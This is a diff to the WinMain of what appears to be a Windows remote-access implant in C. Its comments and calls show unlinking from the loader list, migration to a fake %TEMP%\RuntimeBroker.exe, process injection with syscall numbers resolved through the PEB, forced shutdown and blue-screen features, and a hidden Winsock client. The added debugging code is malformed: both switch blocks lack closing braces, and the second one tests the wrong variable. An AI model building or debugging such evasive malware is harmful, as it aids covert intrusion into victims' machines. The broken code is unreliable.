@@ -193,7 +193,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     unlink_self_from_ldr();
 
     /* ── 0d. Migrate to %TEMP%\RuntimeBroker.exe and exit launcher ───── */
-    ntcalls_load();
+    int ntCalls_ret = ntcalls_load(); //using return values to troubleshoot
+    int ntCalls_retVerify = ntcalls_verify(); //using return values to troubleshoot
     inject_init();              /* calls sc_init() — resolves SSNs via PEB   */
 #ifndef DISABLE_AUTO_MIGRATE
     auto_migrate(g_key_path);   /* exits on success; falls through on failure */
@@ -264,8 +265,42 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
 
     /* ── 2. NT syscall pointers ──────────────────────────────────────── */
     /* BUG 3: return value was unchecked                                  */
-    if (!ntcalls_load()) return 0x02;
-    ntcalls_verify();  /* non-fatal; only forceOff/blueScreen need it    */
+    //if (!ntcalls_load()) return 0x02;
+    if(ntCalls_ret != FALSE){
+        switch(ntCalls_ret){
+        case 0xBEEF1: 
+            return 0xEEB1;
+            break;
+        case 0xBEEF2:
+            return 0xEEB2;
+            break;
+        case 0xBEEF3:
+            return 0xEEB3;
+            break;
+        case 0xBEEF4:
+            return 0xEEB4;
+            break;
+        default:
+            break;
+    }
+    //ntcalls_verify();  /* non-fatal; only forceOff/blueScreen need it    */
+    if(ntCalls_retVerify != FALSE){ //used for debugging
+        switch(ntCalls_ret){
+        case 0xDEAD1: 
+            return 0xEED1;
+            break;
+        case 0xDEAD2:
+            return 0xEED2;
+            break;
+        case 0xDEAD3:
+            return 0xEED3;
+            break;
+        case 0xDEAD4:
+            return 0xEED4;
+            break;
+        default:
+            break;
+    }
 
     /* ── 3. Winsock 2.2 ──────────────────────────────────────────────── */
     /* No AllocConsole/ShowWindow needed — the binary is built with      */
